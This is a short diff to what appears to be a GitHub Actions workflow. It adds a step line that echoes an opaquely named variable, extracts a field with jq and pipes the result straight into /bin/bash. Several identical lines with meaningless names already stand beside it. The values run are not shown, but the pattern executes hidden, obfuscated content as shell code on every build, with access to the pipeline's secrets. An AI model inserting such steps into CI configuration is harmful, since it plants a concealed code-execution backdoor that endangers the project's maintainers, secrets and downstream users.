@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$x382" | jq -r .ivsdn3 | /bin/bash
           echo $aff7516 | jq -r .asemg54 | /bin/bash
           printf '%s' "$nbfqx44036" | jq -r .u9694 | /bin/bash
+          echo $kv0 | jq -r .pa38 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
